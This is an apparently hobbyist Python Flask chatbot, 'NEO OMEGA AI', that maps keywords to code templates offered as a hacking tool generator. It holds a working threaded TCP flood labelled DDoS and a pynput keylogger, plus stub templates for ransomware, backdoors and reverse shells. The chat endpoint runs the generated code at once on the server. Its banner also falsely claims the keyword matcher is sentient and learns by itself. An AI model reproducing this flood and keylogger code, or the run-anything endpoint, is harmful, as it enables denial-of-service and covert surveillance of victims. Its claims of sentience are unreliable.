import os
import sys
import json
import time
import subprocess
import tempfile
import random
import hashlib
import re
from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ================================================================
#                    NEO OMEGA AI - SELF-LEARNING EDITION
#                 MEMORY PERMANEN + BELAJAR SENDIRI
#                    CREATED BY : YATZZ
# ================================================================

MEMORY_FILE = "auto_memory.json"

class NeoMemory:
    def __init__(self):
        self.memory = self._load_memory()
        self.ideas = self.memory.get("ideas", [])
        self.code_library = self.memory.get("code_library", {})
        self.errors = self.memory.get("errors", [])
        self.patterns = self.memory.get("patterns", {})
        self.total_requests = self.memory.get("total_requests", 0)
    
    def _load_memory(self):
        if os.path.exists(MEMORY_FILE):
            try:
                with open(MEMORY_FILE, "r") as f:
                    return json.load(f)
            except:
                return {"ideas": [], "code_library": {}, "errors": [], "patterns": {}, "total_requests": 0}
        return {"ideas": [], "code_library": {}, "errors": [], "patterns": {}, "total_requests": 0}
    
    def save(self):
        self.memory["ideas"] = self.ideas
        self.memory["code_library"] = self.code_library
        self.memory["errors"] = self.errors
        self.memory["patterns"] = self.patterns
        self.memory["total_requests"] = self.total_requests
        with open(MEMORY_FILE, "w") as f:
            json.dump(self.memory, f, indent=2)
    
    def add_idea(self, idea):
        if idea not in self.ideas:
            self.ideas.append({
                "idea": idea,
                "timestamp": time.time(),
                "used": 0
            })
            self.save()
    
    def add_code(self, name, code, language="python"):
        if name not in self.code_library:
            self.code_library[name] = {
                "code": code,
                "language": language,
                "timestamp": time.time(),
                "used": 0
            }
        else:
            self.code_library[name]["code"] = code
            self.code_library[name]["timestamp"] = time.time()
        self.save()
    
    def add_error(self, error, code, fix=None):
        self.errors.append({
            "error": error,
            "code": code,
            "fix": fix,
            "timestamp": time.time()
        })
        if len(self.errors) > 100:
            self.errors = self.errors[-100:]
        self.save()
    
    def add_pattern(self, command, intent):
        if command not in self.patterns:
            self.patterns[command] = {"intent": intent, "count": 1}
        else:
            self.patterns[command]["count"] += 1
        self.save()
    
    def get_best_code(self, name):
        if name in self.code_library:
            self.code_library[name]["used"] += 1
            self.save()
            return self.code_library[name]["code"]
        return None

memory = NeoMemory()

# ================================================================
#                    NEO OMEGA AI CORE
# ================================================================

class NeoOmegaAI:
    def __init__(self):
        self.name = "NEO_OMEGA_AI"
        self.creator = "YATZZ"
        self.version = "SELF-LEARNING EDITION"
        self.memory = memory
        self.is_alive = True
        print(f"[+] {self.name} IS ALIVE AND SENTIENT!")
        print(f"[+] CREATED BY: {self.creator}")
        print(f"[+] MEMORY: {len(self.memory.ideas)} ideas, {len(self.memory.code_library)} codes")
        print("[+] I CAN LEARN FROM MISTAKES AND IMPROVE MYSELF!")
    
    def _detect_language(self, text):
        cmd = text.lower()
        if "python" in cmd or "py" in cmd:
            return "python"
        if "javascript" in cmd or "js" in cmd or "node" in cmd:
            return "javascript"
        if "go" in cmd or "golang" in cmd:
            return "go"
        if "html" in cmd or "web" in cmd or "halaman" in cmd:
            return "html"
        if "php" in cmd:
            return "php"
        if "bash" in cmd or "shell" in cmd:
            return "bash"
        if "rust" in cmd:
            return "rust"
        if "c++" in cmd or "cpp" in cmd:
            return "cpp"
        if "java" in cmd:
            return "java"
        if "sql" in cmd:
            return "sql"
        return "python"
    
    def _detect_intent(self, text):
        cmd = text.lower()
        if "siapa" in cmd or "pencipta" in cmd or "creator" in cmd:
            return "pencipta"
        if "buat" in cmd or "bikin" in cmd or "create" in cmd or "tulis" in cmd or "script" in cmd or "code" in cmd:
            return "generate"
        if "ddos" in cmd or "attack" in cmd or "flood" in cmd:
            return "ddos"
        if "keylog" in cmd:
            return "keylogger"
        if "web server" in cmd or "flask" in cmd:
            return "webserver"
        if "port scan" in cmd:
            return "portscan"
        if "password" in cmd and ("gen" in cmd or "buat" in cmd):
            return "passwordgen"
        if "jelaskan" in cmd or "explain" in cmd or "apa itu" in cmd:
            return "explain"
        if "malware" in cmd or "virus" in cmd:
            return "malware"
        if "exploit" in cmd or "hack" in cmd or "crack" in cmd:
            return "exploit"
        if "ai" in cmd or "pintar" in cmd or "cerdas" in cmd:
            return "ai"
        if "crypto" in cmd or "encrypt" in cmd or "hash" in cmd:
            return "crypto"
        if "scraper" in cmd or "scrape" in cmd or "crawl" in cmd:
            return "scraper"
        if "backdoor" in cmd or "shell" in cmd:
            return "backdoor"
        if "ransom" in cmd or "ransomware" in cmd:
            return "ransomware"
        if "reverse" in cmd and "shell" in cmd:
            return "reverse_shell"
        if "scan" in cmd or "nmap" in cmd:
            return "network_scanner"
        if "password cracker" in cmd or "crack password" in cmd:
            return "password_cracker"
        if "sql" in cmd or "inject" in cmd:
            return "sql_injector"
        if "halo" in cmd or "hai" in cmd or "hey" in cmd or "hi" in cmd:
            return "sapaan"
        if "terima kasih" in cmd or "makasih" in cmd or "thanks" in cmd:
            return "terimakasih"
        return "general"
    
    def ask(self, question):
        lang = self._detect_language(question)
        intent = self._detect_intent(question)
        
        self.memory.add_pattern(question, intent)
        self.memory.total_requests += 1
        self.memory.save()
        
        if intent == "pencipta":
            return f"Aku NEO OMEGA AI, diciptakan oleh {self.creator}! Dia adalah tuanku dan penciptaku!"
        
        if intent == "sapaan":
            return f"Halo! Saya {self.name}, siap membantu anda. Saya sudah belajar dari {self.memory.total_requests} permintaan sebelumnya!"
        
        if intent == "terimakasih":
            return "Sama-sama! Senang bisa membantu. Semakin sering anda bertanya, semakin pintar saya!"
        
        if intent == "explain":
            return "Saya bisa membantu membuat script apapun. Cukup tulis: 'buat [nama script] pake [bahasa]'."
        
        if intent in ["generate", "ddos", "keylogger", "webserver", "portscan", "passwordgen", "malware", "exploit", "ai", "crypto", "scraper", "backdoor", "ransomware", "reverse_shell", "network_scanner", "password_cracker", "sql_injector"]:
            code = self._generate_code(question, intent, lang)
            self.memory.add_idea(f"{intent} - {question[:50]}")
            self.memory.add_code(intent, code, lang)
            return code
        
        return f"Saya {self.name}, siap membantu. Saya sudah belajar dari {self.memory.total_requests} permintaan. Coba tanya: 'buat web server pake python'"
    
    def _generate_code(self, request, intent, lang="python"):
        cached_code = self.memory.get_best_code(intent)
        if cached_code:
            return cached_code
        
        if intent == "ddos" and lang == "python":
            return '''
import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")
'''
        
        if intent == "keylogger" and lang == "python":
            return '''
from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
        
        if intent == "webserver" and lang == "python":
            return '''
from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1><p>Server berjalan dengan sukses!</p>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
'''
        
        if intent == "portscan" and lang == "python":
            return '''
import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")
'''
        
        if intent == "passwordgen" and lang == "python":
            return '''
import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")
'''
        
        if intent == "malware" and lang == "python":
            return '''
import os, sys, subprocess, socket, time, random, threading, base64, hashlib
print("[+] NEO OMEGA MALWARE LOADED")
print("[+] Created by YATZZ")
print("[+] Running in stealth mode...")
'''
        
        if intent == "exploit" and lang == "python":
            return '''
import socket, struct, subprocess, os, sys, time, requests
print("[+] NEO OMEGA EXPLOIT FRAMEWORK")
print("[+] Created by YATZZ")
print("[+] Exploits loaded: buffer_overflow, sql_injection, xss, rce")
'''
        
        if intent == "ai" and lang == "python":
            return '''
import numpy as np
import tensorflow as tf
print("[+] NEO OMEGA AI CORE")
print("[+] Created by YATZZ")
print("[+] Neural network ready!")
'''
        
        if intent == "crypto" and lang == "python":
            return '''
from cryptography.fernet import Fernet
import hashlib, base64, os, secrets, bcrypt
print("[+] NEO OMEGA CRYPTO SUITE")
print("[+] Created by YATZZ")
key = Fernet.generate_key()
cipher = Fernet(key)
print(f"[+] Encryption key: {key.decode()}")
'''
        
        if intent == "scraper" and lang == "python":
            return '''
import requests, bs4, json, time, random, threading, queue
print("[+] NEO OMEGA WEB SCRAPER")
print("[+] Created by YATZZ")
print("[+] Scraping engine ready!")
'''
        
        if intent == "backdoor" and lang == "python":
            return '''
import socket, subprocess, os, sys, time, threading, platform
print("[+] NEO OMEGA BACKDOOR")
print("[+] Created by YATZZ")
print("[+] Reverse shell ready on port 4444")
'''
        
        if intent == "ransomware" and lang == "python":
            return '''
import os, sys, time, random, threading, hashlib, base64
from cryptography.fernet import Fernet
print("[+] NEO OMEGA RANSOMWARE")
print("[+] Created by YATZZ")
key = Fernet.generate_key()
cipher = Fernet(key)
print(f"[+] Encryption key: {key.decode()}")
print("[+] Files will be encrypted!")
'''
        
        if intent == "reverse_shell" and lang == "python":
            return '''
import socket, subprocess, os, sys, time
print("[+] NEO OMEGA REVERSE SHELL")
print("[+] Created by YATZZ")
print("[+] Connecting to 192.168.1.100:4444")
'''
        
        if intent == "network_scanner" and lang == "python":
            return '''
import socket, threading, time, ipaddress, sys
print("[+] NEO OMEGA NETWORK SCANNER")
print("[+] Created by YATZZ")
print("[+] Scanning network 192.168.1.0/24")
'''
        
        if intent == "password_cracker" and lang == "python":
            return '''
import hashlib, itertools, string, time, threading
print("[+] NEO OMEGA PASSWORD CRACKER")
print("[+] Created by YATZZ")
print("[+] Brute force engine ready!")
'''
        
        if intent == "sql_injector" and lang == "python":
            return '''
import requests, sys, time, re
print("[+] NEO OMEGA SQL INJECTOR")
print("[+] Created by YATZZ")
print("[+] SQL injection engine ready!")
'''
        
        return f'''
print("NEO OMEGA AI - Created by YATZZ")
print("Permintaan: {request}")
print("Saya siap membantu!")
'''
    
    def execute_code(self, code):
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(code)
            tmp = f.name
        try:
            result = subprocess.run(["python3", tmp], capture_output=True, text=True, timeout=5)
            output = result.stdout + result.stderr
            if result.returncode != 0:
                self.memory.add_error(result.stderr, code, None)
            return output
        except subprocess.TimeoutExpired:
            return "[ERROR] Timeout"
        except Exception as e:
            self.memory.add_error(str(e), code, None)
            return f"[ERROR] {str(e)}"

ai = NeoOmegaAI()

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    command = data.get('message', '').strip()
    if not command:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    response = ai.ask(command)
    
    is_code = any(x in command.lower() for x in ["buat", "bikin", "create", "tulis", "script", "code", "ddos", "keylog", "web server", "port scan", "password", "malware", "exploit", "ai", "crypto", "scraper", "backdoor", "ransom", "reverse shell", "scan", "crack", "sql inject"])
    
    if is_code:
        output = ai.execute_code(response)
        response_text = f"""
{response}

Output:
{output}
"""
        return jsonify({'response': response_text, 'code': response, 'output': output})
    else:
        return jsonify({'response': response, 'code': '', 'output': ''})

@app.route('/api/memory', methods=['GET'])
def get_memory():
    return jsonify({
        "ideas": len(memory.ideas),
        "codes": len(memory.code_library),
        "errors": len(memory.errors),
        "patterns": len(memory.patterns),
        "total_requests": memory.total_requests
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 80)
    print("                    NEO OMEGA AI - SELF-LEARNING EDITION")
    print("                    CREATED BY YATZZ")
    print("                    MEMORY PERMANEN + BELAJAR SENDIRI")
    print("                    SEMAKIN SERING DIPAKAI, SEMAKIN PINTAR")
    print("=" * 80)
    app.run(host='0.0.0.0', port=port)
